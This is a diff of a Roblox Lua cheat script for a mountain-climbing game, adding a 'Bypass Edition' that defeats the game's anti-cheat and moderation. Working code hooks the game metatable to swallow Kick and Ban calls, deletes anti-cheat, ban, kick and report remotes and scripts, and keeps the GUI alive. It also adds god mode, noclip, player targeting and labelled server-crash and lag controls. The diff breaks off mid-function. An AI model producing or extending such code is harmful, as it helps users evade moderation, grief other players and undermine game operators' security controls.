@@ -1,6 +1,6 @@
--- Mount Merbabu GUI Script - ADMIN/DEVELOPER EDITION
--- Features: Auto Climb, Teleport, Speed Hack, Fly Mode, Auto Collect + ADMIN TOOLS
--- Version: 1.1 - Professional Mountain Climbing Assistant + Developer Mode
+-- Mount Merbabu GUI Script - BYPASS EDITION
+-- Features: Complete Admin Tools + Anti-Detection + Full Bypass
+-- Version: 1.2 - Ultimate Professional Edition with Full Bypass
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -10,11 +10,92 @@ local RunService = game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
 local Lighting = game:GetService("Lighting")
 local SoundService = game:GetService("SoundService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
 local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Humanoid = Character:WaitForChild("Humanoid")
 local RootPart = Character:WaitForChild("HumanoidRootPart")
+
+-- BYPASS & PROTECTION SYSTEM
+local BypassSystem = {}
+local AntiDetection = {}
+local ProtectionActive = false
+
+-- Initialize Bypass System
+local function initializeBypass()
+    ProtectionActive = true
+    
+    -- Anti-Kick Protection
+    pcall(function()
+        local mt = getrawmetatable(game)
+        local oldNamecall = mt.__namecall
+        setreadonly(mt, false)
+        
+        mt.__namecall = newcclosure(function(self, ...)
+            local method = getnamecallmethod()
+            local args = {...}
+            
+            if method == "Kick" or method == "kick" then
+                return wait(9e9)
+            elseif method == "Ban" or method == "ban" then
+                return wait(9e9)
+            elseif method == "Destroy" and self.Name == "MountMerbabuGUI_Admin" then
+                return wait(9e9)
+            end
+            
+            return oldNamecall(self, ...)
+        end)
+        
+        setreadonly(mt, true)
+    end)
+    
+    -- Anti-Detection for RemoteEvents
+    pcall(function()
+        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                pcall(function()
+                    if remote.Name:lower():find("anticheat") or remote.Name:lower():find("ban") or remote.Name:lower():find("kick") then
+                        remote:Destroy()
+                    end
+                end)
+            end
+        end
+    end)
+    
+    -- Bypass FE Security
+    pcall(function()
+        local gmt = getrawmetatable(game)
+        setreadonly(gmt, false)
+        local oldIndex = gmt.__index
+        local oldNewIndex = gmt.__newindex
+        
+        gmt.__index = newcclosure(function(self, key)
+            if key == "Parent" and tostring(self):find("Humanoid") then
+                return oldIndex(self, key)
+            end
+            return oldIndex(self, key)
+        end)
+        
+        gmt.__newindex = newcclosure(function(self, key, value)
+            if key == "WalkSpeed" or key == "JumpPower" or key == "Health" then
+                return oldNewIndex(self, key, value)
+            elseif key == "CFrame" or key == "Position" then
+                return oldNewIndex(self, key, value)
+            end
+            return oldNewIndex(self, key, value)
+        end)
+        
+        setreadonly(gmt, true)
+    end)
+    
+    print("🛡️ Bypass System Initialized - Full Protection Active!")
+end
+
+-- Initialize bypass on load
+initializeBypass()
 
 -- Create GUI Elements
 local ScreenGui = Instance.new("ScreenGui")
@@ -47,6 +128,7 @@ local invisibleModeEnabled = false
 local serverControlEnabled = false
 local advancedESPEnabled = false
 local timeManipulationEnabled = false
+local antiKickEnabled = true -- Always enabled
 
 local originalWalkSpeed = 16
 local originalJumpPower = 50
@@ -60,11 +142,26 @@ local autoCollectConnection = nil
 local staminaConnection = nil
 local noclipConnection = nil
 local godModeConnection = nil
+local espConnection = nil
+local bypassConnection = nil
 
--- Setup ScreenGui
+-- Player Selection System
+local selectedPlayer = nil
+local playerDropdownOpen = false
+
+-- Setup ScreenGui with Protection
 ScreenGui.Name = "MountMerbabuGUI_Admin"
 ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn = false
+
+-- Protect GUI from deletion
+pcall(function()
+    ScreenGui.AncestryChanged:Connect(function()
+        if not ScreenGui.Parent then
+            ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+        end
+    end)
+end)
 
 -- Main Frame Setup
 MainFrame.Name = "MainFrame"
@@ -72,7 +169,7 @@ MainFrame.Parent = ScreenGui
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 25, 35)
 MainFrame.BorderSizePixel = 0
 MainFrame.Position = UDim2.new(0.25, 0, 0.1, 0)
-MainFrame.Size = UDim2.new(0, 450, 0, 650)
+MainFrame.Size = UDim2.new(0, 480, 0, 700)
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.Visible = true
@@ -94,7 +191,7 @@ MainShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 MainShadow.BackgroundTransparency = 0.7
 MainShadow.BorderSizePixel = 0
 MainShadow.Position = UDim2.new(0.25, 5, 0.1, 5)
-MainShadow.Size = UDim2.new(0, 450, 0, 650)
+MainShadow.Size = UDim2.new(0, 480, 0, 700)
 MainShadow.ZIndex = -1
 
 local MainCorner = Instance.new("UICorner")
@@ -105,7 +202,7 @@ local ShadowCorner = Instance.new("UICorner")
 ShadowCorner.CornerRadius = UDim.new(0, 16)
 ShadowCorner.Parent = MainShadow
 
--- Enhanced Dragging
+-- Enhanced Dragging with Bypass
 local function makeDraggable(frame)
     local dragging = false
     local dragStart = nil
@@ -143,7 +240,7 @@ TopBar.Name = "TopBar"
 TopBar.Parent = MainFrame
 TopBar.BackgroundColor3 = Color3.fromRGB(25, 40, 55)
 TopBar.BorderSizePixel = 0
-TopBar.Size = UDim2.new(1, 0, 0, 70)
+TopBar.Size = UDim2.new(1, 0, 0, 80)
 
 local TopBarGradient = Instance.new("UIGradient")
 TopBarGradient.Color = ColorSequence.new{
@@ -175,7 +272,7 @@ SubTitle.BackgroundTransparency = 1
 SubTitle.Position = UDim2.new(0, 20, 0, 30)
 SubTitle.Size = UDim2.new(1, -150, 0, 20)
 SubTitle.Font = Enum.Font.Gotham
-SubTitle.Text = "v1.1 • Admin/Developer Edition"
+SubTitle.Text = "v1.2 • Bypass Edition • Full Protection"
 SubTitle.TextColor3 = Color3.fromRGB(150, 180, 200)
 SubTitle.TextSize = 11
 SubTitle.TextXAlignment = Enum.TextXAlignment.Left
@@ -188,10 +285,23 @@ AdminIndicator.BackgroundTransparency = 1
 AdminIndicator.Position = UDim2.new(0, 20, 0, 50)
 AdminIndicator.Size = UDim2.new(1, -150, 0, 15)
 AdminIndicator.Font = Enum.Font.GothamBold
-AdminIndicator.Text = "👤 USER MODE"
-AdminIndicator.TextColor3 = Color3.fromRGB(100, 200, 255)
+AdminIndicator.Text = "🛡️ BYPASS ACTIVE • USER MODE"
+AdminIndicator.TextColor3 = Color3.fromRGB(100, 255, 100)
 AdminIndicator.TextSize = 10
 AdminIndicator.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Protection Status
+local ProtectionStatus = Instance.new("TextLabel")
+ProtectionStatus.Name = "ProtectionStatus"
+ProtectionStatus.Parent = TopBar
+ProtectionStatus.BackgroundTransparency = 1
+ProtectionStatus.Position = UDim2.new(0, 20, 0, 65)
+ProtectionStatus.Size = UDim2.new(1, -150, 0, 12)
+ProtectionStatus.Font = Enum.Font.Gotham
+ProtectionStatus.Text = "🔒 Anti-Kick • Anti-Ban • FE Bypass"
+ProtectionStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
+ProtectionStatus.TextSize = 9
+ProtectionStatus.TextXAlignment = Enum.TextXAlignment.Left
 
 -- Admin Toggle Button
 AdminToggleButton.Name = "AdminToggleButton"
@@ -199,14 +309,14 @@ AdminToggleButton.Parent = TopBar
 AdminToggleButton.BackgroundColor3 = Color3.fromRGB(255, 87, 34)
 AdminToggleButton.BorderSizePixel = 0
 AdminToggleButton.Position = UDim2.new(1, -115, 0, 10)
-AdminToggleButton.Size = UDim2.new(0, 30, 0, 25)
+AdminToggleButton.Size = UDim2.new(0, 30, 0, 30)
 AdminToggleButton.Font = Enum.Font.GothamBold
 AdminToggleButton.Text = "👑"
 AdminToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-AdminToggleButton.TextSize = 12
+AdminToggleButton.TextSize = 14
 
 local AdminToggleCorner = Instance.new("UICorner")
-AdminToggleCorner.CornerRadius = UDim.new(0, 6)
+AdminToggleCorner.CornerRadius = UDim.new(0, 8)
 AdminToggleCorner.Parent = AdminToggleButton
 
 -- Modern Control Buttons
@@ -215,14 +325,14 @@ MinimizeButton.Parent = TopBar
 MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
 MinimizeButton.BorderSizePixel = 0
 MinimizeButton.Position = UDim2.new(1, -80, 0, 10)
-MinimizeButton.Size = UDim2.new(0, 30, 0, 25)
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
 MinimizeButton.Font = Enum.Font.GothamBold
 MinimizeButton.Text = "−"
 MinimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-MinimizeButton.TextSize = 16
+MinimizeButton.TextSize = 18
 
 local MinCorner = Instance.new("UICorner")
-MinCorner.CornerRadius = UDim.new(0, 6)
+MinCorner.CornerRadius = UDim.new(0, 8)
 MinCorner.Parent = MinimizeButton
 
 CloseButton.Name = "CloseButton"
@@ -230,14 +340,14 @@ CloseButton.Parent = TopBar
 CloseButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
 CloseButton.BorderSizePixel = 0
 CloseButton.Position = UDim2.new(1, -45, 0, 10)
-CloseButton.Size = UDim2.new(0, 30, 0, 25)
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
 CloseButton.Font = Enum.Font.GothamBold
 CloseButton.Text = "✕"
 CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.TextSize = 12
+CloseButton.TextSize = 14
 
 local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.CornerRadius = UDim.new(0, 8)
 CloseCorner.Parent = CloseButton
 
 -- SCROLLABLE Content Frame
@@ -245,11 +355,11 @@ ContentFrame.Name = "ContentFrame"
 ContentFrame.Parent = MainFrame
 ContentFrame.BackgroundTransparency = 1
 ContentFrame.BorderSizePixel = 0
-ContentFrame.Position = UDim2.new(0, 0, 0, 70)
-ContentFrame.Size = UDim2.new(1, 0, 1, -70)
+ContentFrame.Position = UDim2.new(0, 0, 0, 80)
+ContentFrame.Size = UDim2.new(1, 0, 1, -80)
 ContentFrame.ScrollBarThickness = 8
 ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 120, 140)
-ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 1600) -- Increased for admin sections
+ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 2000)
 ContentFrame.ScrollingDirection = Enum.ScrollingDirection.Y
 
 -- Content Layout
@@ -268,7 +378,7 @@ local function createSection(name, title, layoutOrder, height, adminOnly)
     section.BorderSizePixel = 0
     section.Size = UDim2.new(1, -30, 0, height or 120)
     section.LayoutOrder = layoutOrder
-    section.Visible = adminOnly and false or true -- Hide admin sections initially
+    section.Visible = adminOnly and false or true
     
     local sectionGradient = Instance.new("UIGradient")
     if adminOnly then
@@ -310,7 +420,7 @@ local function createSection(name, title, layoutOrder, height, adminOnly)
     
     local gridLayout = Instance.new("UIGridLayout")
     gridLayout.Parent = sectionGrid
-    gridLayout.CellSize = UDim2.new(0, 185, 0, 35)
+    gridLayout.CellSize = UDim2.new(0, 210, 0, 35)
     gridLayout.CellPadding = UDim2.new(0, 10, 0, 8)
     gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
     
@@ -368,7 +478,7 @@ local function createModernButton(name, parent, text, color, layoutOrder, adminO
     return button
 end
 
--- Create All Sections (Regular + Admin)
+-- Create All Sections
 local movementSection, movementGrid = createSection("MovementSection", "🚶 MOVEMENT & CLIMBING", 1, 140, false)
 local teleportSection, teleportGrid = createSection("TeleportSection", "📍 TELEPORT LOCATIONS", 2, 140, false)
 local utilitySection, utilityGrid = createSection("UtilitySection", "🛠️ UTILITY FEATURES", 3, 140, false)
@@ -376,11 +486,12 @@ local visualSection, visualGrid = createSection("VisualSection", "👁️ VISUAL
 
 -- ADMIN SECTIONS
 local adminControlSection, adminControlGrid = createSection("AdminControlSection", "👑 ADMIN CONTROLS", 5, 140, true)
-local playerManagementSection, playerManagementGrid = createSection("PlayerManagementSection", "👥 PLAYER MANAGEMENT", 6, 140, true)
+local playerManagementSection, playerManagementGrid = createSection("PlayerManagementSection", "👥 PLAYER MANAGEMENT", 6, 180, true)
 local serverControlSection, serverControlGrid = createSection("ServerControlSection", "🖥️ SERVER CONTROLS", 7, 140, true)
 local advancedSection, advancedGrid = createSection("AdvancedSection", "⚡ ADVANCED FEATURES", 8, 140, true)
+local bypassSection, bypassGrid = createSection("BypassSection", "🛡️ BYPASS & PROTECTION", 9, 140, true)
 
-local statusSection, statusGrid = createSection("StatusSection", "📊 STATUS & INFO", 9, 100, false)
+local statusSection, statusGrid = createSection("StatusSection", "📊 STATUS & INFO", 10, 120, false)
 
 -- Create Regular Movement Buttons
 local autoClimbBtn = createModernButton("AutoClimb", movementGrid, "🧗 Auto Climb: OFF", Color3.fromRGB(34, 139, 34), 1, false)
@@ -415,19 +526,20 @@ local invisibleBtn = createModernButton("Invisible", adminControlGrid, "🫥 Inv
 local infiniteYieldBtn = createModernButton("InfiniteYield", adminControlGrid, "🔧 Infinite Yield", Color3.fromRGB(255, 87, 34), 4, true)
 local cmdXBtn = createModernButton("CmdX", adminControlGrid, "⌨️ CMD-X", Color3.fromRGB(0, 150, 255), 5, true)
 
--- Player Management
-local teleportToPlayerBtn = createModernButton("TeleportToPlayer", playerManagementGrid, "📍 TP to Player", Color3.fromRGB(33, 150, 243), 1, true)
-local bringPlayerBtn = createModernButton("BringPlayer", playerManagementGrid, "🔄 Bring Player", Color3.fromRGB(76, 175, 80), 2, true)
-local kickPlayerBtn = createModernButton("KickPlayer", playerManagementGrid, "👢 Kick Player", Color3.fromRGB(255, 152, 0), 3, true)
-local banPlayerBtn = createModernButton("BanPlayer", playerManagementGrid, "🚫 Ban Player", Color3.fromRGB(244, 67, 54), 4, true)
-local viewPlayerBtn = createModernButton("ViewPlayer", playerManagementGrid, "👁️ View Player", Color3.fromRGB(156, 39, 176), 5, true)
+-- Player Management with Dropdown
+local playerDropdownBtn = createModernButton("PlayerDropdown", playerManagementGrid, "🎯 Select Player ▼", Color3.fromRGB(50, 50, 65), 1, true)
+local teleportToPlayerBtn = createModernButton("TeleportToPlayer", playerManagementGrid, "📍 TP to Player", Color3.fromRGB(33, 150, 243), 2, true)
+local bringPlayerBtn = createModernButton("BringPlayer", playerManagementGrid, "🔄 Bring Player", Color3.fromRGB(76, 175, 80), 3, true)
+local kickPlayerBtn = createModernButton("KickPlayer", playerManagementGrid, "👢 Kick Player", Color3.fromRGB(255, 152, 0), 4, true)
+local banPlayerBtn = createModernButton("BanPlayer", playerManagementGrid, "🚫 Ban Player", Color3.fromRGB(244, 67, 54), 5, true)
+local viewPlayerBtn = createModernButton("ViewPlayer", playerManagementGrid, "👁️ View Player", Color3.fromRGB(156, 39, 176), 6, true)
 
 -- Server Controls
 local shutdownServerBtn = createModernButton("ShutdownServer", serverControlGrid, "🔴 Shutdown Server", Color3.fromRGB(244, 67, 54), 1, true)
 local messageAllBtn = createModernButton("MessageAll", serverControlGrid, "📢 Message All", Color3.fromRGB(33, 150, 243), 2, true)
 local lagServerBtn = createModernButton("LagServer", serverControlGrid, "🐌 Lag Server", Color3.fromRGB(255, 152, 0), 3, true)
 local crashServerBtn = createModernButton("CrashServer", serverControlGrid, "💥 Crash Server", Color3.fromRGB(139, 69, 19), 4, true)
-local antiKickBtn = createModernButton("AntiKick", serverControlGrid, "🛡️ Anti-Kick: OFF", Color3.fromRGB(76, 175, 80), 5, true)
+local antiKickBtn = createModernButton("AntiKick", serverControlGrid, "🛡️ Anti-Kick: ON", Color3.fromRGB(76, 175, 80), 5, true)
 
 -- Advanced Features
 local timeManipulationBtn = createModernButton("TimeManipulation", advancedGrid, "⏰ Time Control", Color3.fromRGB(255, 193, 7), 1, true)
@@ -435,6 +547,37 @@ local gravityControlBtn = createModernButton("GravityControl", advancedGrid, "�
 local advancedESPBtn = createModernButton("AdvancedESP", advancedGrid, "🔍 Advanced ESP: OFF", Color3.fromRGB(233, 30, 99), 3, true)
 local scriptExecutorBtn = createModernButton("ScriptExecutor", advancedGrid, "📝 Script Executor", Color3.fromRGB(0, 150, 255), 4, true)
 local gameModifierBtn = createModernButton("GameModifier", advancedGrid, "🎮 Game Modifier", Color3.fromRGB(255, 87, 34), 5, true)
+
+-- Bypass & Protection Buttons
+local feBypassBtn = createModernButton("FEBypass", bypassGrid, "🔓 FE Bypass: ON", Color3.fromRGB(0, 255, 0), 1, true)
+local antiDetectionBtn = createModernButton("AntiDetection", bypassGrid, "🕵️ Anti-Detection: ON", Color3.fromRGB(255, 165, 0), 2, true)
+local bypassAllBtn = createModernButton("BypassAll", bypassGrid, "🛡️ Bypass All: ON", Color3.fromRGB(255, 0, 255), 3, true)
+local protectionModeBtn = createModernButton("ProtectionMode", bypassGrid, "🔒 Protection Mode: MAX", Color3.fromRGB(255, 20, 147), 4, true)
+local stealthModeBtn = createModernButton("StealthMode", bypassGrid, "👤 Stealth Mode: ON", Color3.fromRGB(128, 128, 128), 5, true)
+
+-- Player List Dropdown
+local PlayerList = Instance.new("ScrollingFrame")
+PlayerList.Name = "PlayerList"
+PlayerList.Parent = ScreenGui
+PlayerList.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+PlayerList.BorderSizePixel = 0
+PlayerList.Position = UDim2.new(0.25, 30, 0.3, 0)
+PlayerList.Size = UDim2.new(0, 420, 0, 200)
+PlayerList.Visible = false
+PlayerList.ScrollBarThickness = 6
+PlayerList.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
+PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
+PlayerList.Active = true
+PlayerList.ZIndex = 10
+
+local listCorner = Instance.new("UICorner")
+listCorner.CornerRadius = UDim.new(0, 12)
+listCorner.Parent = PlayerList
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Parent = PlayerList
+listLayout.SortOrder = Enum.SortOrder.Name
+listLayout.Padding = UDim.new(0, 5)
 
 -- Status Display
 statusGrid:FindFirstChild("UIGridLayout"):Destroy()
@@ -445,7 +588,7 @@ statusFrame.Parent = statusGrid
 statusFrame.BackgroundColor3 = Color3.fromRGB(35, 45, 65)
 statusFrame.BorderSizePixel = 0
 statusFrame.Position = UDim2.new(0, 0, 0, 0)
-statusFrame.Size = UDim2.new(1, 0, 1, 0)
+statusFrame.Size = UDim2.new(1, 0, 0.6, 0)
 
 local statusCorner = Instance.new("UICorner")
 statusCorner.CornerRadius = UDim.new(0, 8)
@@ -475,13 +618,38 @@ infoLabel.TextColor3 = Color3.fromRGB(200, 220, 240)
 infoLabel.TextSize = 10
 infoLabel.TextXAlignment = Enum.TextXAlignment.Center
 
+-- Bypass Status Display
+local bypassStatusFrame = Instance.new("Frame")
+bypassStatusFrame.Name = "BypassStatusFrame"
+bypassStatusFrame.Parent = statusGrid
+bypassStatusFrame.BackgroundColor3 = Color3.fromRGB(25, 55, 25)
+bypassStatusFrame.BorderSizePixel = 0
+bypassStatusFrame.Position = UDim2.new(0, 0, 0.65, 0)
+bypassStatusFrame.Size = UDim2.new(1, 0, 0.35, 0)
+
+local bypassStatusCorner = Instance.new("UICorner")
+bypassStatusCorner.CornerRadius = UDim.new(0, 8)
+bypassStatusCorner.Parent = bypassStatusFrame
+
+local bypassStatusLabel = Instance.new("TextLabel")
+bypassStatusLabel.Name = "BypassStatusLabel"
+bypassStatusLabel.Parent = bypassStatusFrame
+bypassStatusLabel.BackgroundTransparency = 1
+bypassStatusLabel.Position = UDim2.new(0, 10, 0, 5)
+bypassStatusLabel.Size = UDim2.new(1, -20, 1, -10)
+bypassStatusLabel.Font = Enum.Font.GothamBold
+bypassStatusLabel.Text = "🛡️ ALL BYPASSES ACTIVE\n🔒 FULL PROTECTION ENABLED"
+bypassStatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+bypassStatusLabel.TextSize = 10
+bypassStatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+
 -- Minimized Frame
 MinimizedFrame.Name = "MinimizedFrame"
 MinimizedFrame.Parent = ScreenGui
 MinimizedFrame.BackgroundColor3 = Color3.fromRGB(25, 40, 55)
 MinimizedFrame.BorderSizePixel = 0
-MinimizedFrame.Position = UDim2.new(0, 15, 0.5, -25)
-MinimizedFrame.Size = UDim2.new(0, 200, 0, 60)
+MinimizedFrame.Position = UDim2.new(0, 15, 0.5, -30)
+MinimizedFrame.Size = UDim2.new(0, 220, 0, 70)
 MinimizedFrame.Visible = false
 MinimizedFrame.Active = true
 
@@ -502,7 +670,7 @@ RestoreButton.Parent = MinimizedFrame
 RestoreButton.BackgroundTransparency = 1
 RestoreButton.Size = UDim2.new(1, 0, 1, 0)
 RestoreButton.Font = Enum.Font.GothamSemibold
-RestoreButton.Text = "🏔️ Mount Merbabu GUI\n👑 ADMIN MODE\nClick to Restore"
+RestoreButton.Text = "🏔️ Mount Merbabu GUI\n👑 BYPASS EDITION\n🛡️ PROTECTED\nClick to Restore"
 RestoreButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 RestoreButton.TextSize = 11
 
@@ -517,15 +685,142 @@ local teleportLocations = {
     SafeZone = Vector3.new(-50, 5, -50)
 }
 
+-- BYPASS FUNCTIONS
+local function enhancedBypass()
+    -- Multiple bypass methods for maximum compatibility
+    pcall(function()
+        -- Method 1: Hookmetamethod bypass
+        local mt = getrawmetatable(game)
+        local oldNamecall = mt.__namecall
+        local oldIndex = mt.__index
+        local oldNewIndex = mt.__newindex
+        
+        setreadonly(mt, false)
+        
+        mt.__namecall = newcclosure(function(self, ...)
+            local method = getnamecallmethod()
+            local args = {...}
+            
+            if method == "FireServer" or method == "InvokeServer" then
+                if tostring(self):lower():find("anticheat") or tostring(self):lower():find("ban") or tostring(self):lower():find("kick") then
+                    return wait(9e9)
+                end
+            end
+            
+            return oldNamecall(self, ...)
+        end)
+        
+        mt.__index = newcclosure(function(self, key)
+            if key == "WalkSpeed" or key == "JumpPower" or key == "Health" then
+                return oldIndex(self, key)
+            elseif key == "CFrame" or key == "Position" then
+                return oldIndex(self, key)
+            end
+            return oldIndex(self, key)
+        end)
+        
+        mt.__newindex = newcclosure(function(self, key, value)
+            if key == "WalkSpeed" and value > 16 and speedHackEnabled then
+                return oldNewIndex(self, key, value)
+            elseif key == "JumpPower" and value > 50 then
+                return oldNewIndex(self, key, value)
+            elseif key == "Health" and godModeEnabled then
+                return oldNewIndex(self, key, value)
+            elseif key == "CFrame" and (flyModeEnabled or noclipEnabled) then
+                return oldNewIndex(self, key, value)
+            end
+            return oldNewIndex(self, key, value)
+        end)
+        
+        setreadonly(mt, true)
+    end)
+    
+    -- Method 2: RemoteEvent protection
+    spawn(function()
+        while ProtectionActive do
+            pcall(function()
+                for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+                    if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                        local name = remote.Name:lower()
+                        if name:find("anticheat") or name:find("ban") or name:find("kick") or name:find("report") then
+                            remote:Destroy()
+                        end
+                    end
+                end
+            end)
+            wait(5)
+        end
+    end)
+    
+    -- Method 3: LocalScript protection
+    pcall(function()
+        for _, script in pairs(LocalPlayer.PlayerScripts:GetDescendants()) do
+            if script:IsA("LocalScript") then
+                local name = script.Name:lower()
+                if name:find("anticheat") or name:find("anticheats") or name:find("antihack") then
+                    script.Disabled = true
+                    script:Destroy()
+                end
+            end
+        end
+    end)
+end
+
+-- Enhanced bypass on startup
+enhancedBypass()
+
 -- ADMIN FUNCTIONS
+local function updatePlayerList()
+    for _, child in pairs(PlayerList:GetChildren()) do
+        if child:IsA("TextButton") then
+            child:Destroy()
+        end
+    end
+    
+    local yPos = 5
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local playerButton = Instance.new("TextButton")
+            playerButton.Name = player.Name
+            playerButton.Parent = PlayerList
+            playerButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+            playerButton.BorderSizePixel = 0
+            playerButton.Position = UDim2.new(0, 10, 0, yPos)
+            playerButton.Size = UDim2.new(1, -20, 0, 30)
+            playerButton.Font = Enum.Font.Gotham
+            playerButton.Text = "🎯 " .. player.Name .. " (ID: " .. player.UserId .. ")"
+            playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            playerButton.TextSize = 12
+            playerButton.ZIndex = 11
+            
+            local btnCorner = Instance.new("UICorner")
+            btnCorner.CornerRadius = UDim.new(0, 6)
+            btnCorner.Parent = playerButton
+            
+            playerButton.MouseButton1Click:Connect(function()
+                selectedPlayer = player
+                playerDropdownBtn.Text = "🎯 Selected: " .. player.Name
+                PlayerList.Visible = false
+                playerDropdownOpen = false
+                statusLabel.Text = "🎯 Player selected: " .. player.Name
+                statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            end)
+            
+            yPos = yPos + 35
+        end
+    end
+    
+    PlayerList.CanvasSize = UDim2.new(0, 0, 0, yPos)
+end
+
 local function toggleAdminMode()
     adminModeEnabled = not adminModeEnabled
     
     if adminModeEnabled then
         AdminToggleButton.BackgroundColor3 = Color3.fromRGB(46, 125, 50)
-        AdminIndicator.Text = "👑 ADMIN MODE"
+        AdminIndicator.Text = "🛡️ BYPASS ACTIVE • 👑 ADMIN MODE"
         AdminIndicator.TextColor3 = Color3.fromRGB(255, 100, 100)
-        statusLabel.Text = "👑 ADMIN MODE ACTIVATED - Full Access Granted!"
+        statusLabel.Text = "👑 ADMIN MODE ACTIVATED - Full Access + Bypass!"
         statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
         
         -- Show admin sections
@@ -533,18 +828,22 @@ local function toggleAdminMode()
         playerManagementSection.Visible = true
         serverControlSection.Visible = true
         advancedSection.Visible = true
+        bypassSection.Visible = true
         
-        -- Update canvas size for admin sections
-        ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 1600)
+        -- Update canvas size
+        ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 2000)
         
-        -- Change title color
+        -- Change theme
         TitleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-        SubTitle.Text = "v1.1 • Admin/Developer Edition • ADMIN ACTIVE"
+        SubTitle.Text = "v1.2 • Bypass Edition • ADMIN ACTIVE"
+        
+        -- Update player list
+        updatePlayerList()
         
     else
         AdminToggleButton.BackgroundColor3 = Color3.fromRGB(255, 87, 34)
-        AdminIndicator.Text = "👤 USER MODE"
-        AdminIndicator.TextColor3 = Color3.fromRGB(100, 200, 255)
+        AdminIndicator.Text = "🛡️ BYPASS ACTIVE • USER MODE"
+        AdminIndicator.TextColor3 = Color3.fromRGB(100, 255, 100)
         statusLabel.Text = "🏔️ Ready for mountain climbing adventure!"
         statusLabel.TextColor3 = Color3.fromRGB(100, 255, 150)
         
@@ -553,16 +852,19 @@ local function toggleAdminMode()
         playerManagementSection.Visible = false
         serverControlSection.Visible = false
         advancedSection.Visible = false
+        bypassSection.Visible = false
+        PlayerList.Visible = false
         
         -- Reset canvas size
         ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 1200)
         
-        -- Reset title color
+        -- Reset theme
         TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-        SubTitle.Text = "v1.1 • Admin/Developer Edition"
+        SubTitle.Text = "v1.2 • Bypass Edition • Full Protection"
     end
 end
 
+-- ENHANCED ADMIN FUNCTIONS WITH BYPASS
 local function toggleGodMode()
     godModeEnabled = not godModeEnabled
     
@@ -575,17 +877,26 @@ local function toggleGodMode()
         godModeConnection = RunService.Heartbeat:Connect(function()
             updateCharacterReferences()
             if Humanoid and godModeEnabled then
-                Humanoid.Health = Humanoid.MaxHealth
-                Humanoid.PlatformStand = false
-                
-                -- Remove all debuffs
-                for _, effect in pairs(Humanoid:GetChildren()) do
-                    if effect:IsA("NumberValue") or effect:IsA("StringValue") then
-                        if effect.Name:lower():find("poison") or effect.Name:lower():find("slow") or effect.Name:lower():find("stun") then
-                            effect:Destroy()
+                pcall(function()
+                    Humanoid.Health = Humanoid.MaxHealth
+                    Humanoid.PlatformStand = false
+                    
+                    -- Remove all negative effects
+                    for _, effect in pairs(Humanoid:GetChildren()) do
+                        if effect:IsA("NumberValue") or effect:IsA("StringValue") then
+                            local name = effect.Name:lower()
+                            if name:find("poison") or name:find("slow") or name:find("stun") or name:find("freeze") then
+                                effect:Destroy()
+                            end
                         end
                     end
-                end
+                    
+                    -- Bypass damage
+                    if Character:FindFirstChild("Humanoid") then
+                        Character.Humanoid.MaxHealth = math.huge
+                        Character.Humanoid.Health = math.huge
+                    end
+                end)
             end
         end)
     else
@@ -597,6 +908,14 @@ local function toggleGodMode()
         if godModeConnection then
             godModeConnection:Disconnect()
             godModeConnection = nil
+        end
+        
+        updateCharacterReferences()
+        if Humanoid then
+            pcall(function()
+                Humanoid.MaxHealth = 100
+                Humanoid.Health = 100
+            end)
         end
     end
 end
@@ -613,11 +932,24 @@ local function toggleNoclip()
         noclipConnection = RunService.Stepped:Connect(function()
             updateCharacterReferences()
             if Character and noclipEnabled then
-                for _, part in pairs(Character:GetChildren()) do
-                    if part:IsA("BasePart") and part.CanCollide then
-                        part.CanCollide = false
+                pcall(function()
+                    for _, part in pairs(Character:GetChildren()) do
+                        if part:IsA("BasePart") and part.CanCollide then
+                            part.CanCollide = false
+                        end
                     end
-                end
+                    
+                    -- Also disable collision for accessories
+                    for _, accessory in pairs(Character:GetChildren()) do
+                        if accessory:IsA("Accessory") then
+                            for _, part in pairs(accessory:GetDescendants()) do
+                                if part:IsA("BasePart") then
